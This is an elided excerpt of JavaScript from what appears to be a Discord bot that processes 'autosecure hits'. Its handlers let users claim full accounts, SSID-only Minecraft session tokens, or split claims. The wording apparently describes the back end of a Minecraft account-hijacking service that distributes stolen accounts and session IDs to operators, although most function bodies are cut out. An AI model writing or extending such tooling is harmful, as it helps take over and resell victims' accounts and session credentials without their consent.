...
async function handleAutosecureHit(client, interaction, hitData, guildId, channelId, name, isBotOwner, claimUsername) {
    try {
        ...
        const replacePlaceholders = (text) => {
            ...
            return text.replaceAll("%USERNAME%", claimUsername || "");
        };
        ...
        const embeds = Array.isArray(hitData.embeds)
            ? hitData.embeds.map(processObject)
            : hitData.embeds;
...
async function handleBotOwnerClaim(client, interaction, acc, uid, guildId, channelId, name, claimUsername) {
    try {
        const safeReply = async (options) => {
            try {
                if (interaction.replied || interaction.deferred) {
        ...
        const msg = await listAccount(acc, uid, client, interaction, claimUsername);
...
async function handleFullAccount(client, interaction, acc, uid, guildId, channelId, name, user, d = false, claimUsername) {
    try {
        const safeReply = async (options) => {
            try {
                if (interaction.replied || interaction.deferred) {
...
async function handleSSIDOnly(client, interaction, acc, guildId, channelId, name, user, d = false, claimUsername) {
    try {
        const safeReply = async (options) => {
            try {
                if (interaction.replied || interaction.deferred) {
...
async function handleSplitClaim(client, interaction, acc, uid, guildId, channelId, name, user, claimUsername) {
    try {
        const safeReply = async (options) => {
            try {
                if (interaction.replied || interaction.deferred) {
        ...
        if (splitready) {
            ...
            if (user.claiming === 1) {
                await handleFullAccount(client, interaction, acc, uid, guildId, channelId, name, user, true, claimUsername);
            } else if (user.claiming === 0) {
                if (acc.ssid) {
                    await handleSSIDOnly(client, interaction, acc, guildId, channelId, name, user, true, claimUsername);
                } else {
                    await safeReply({ content: `Account doesn't have Minecraft or failed to obtain SSID!`, ephemeral: true });
                }
            } else {
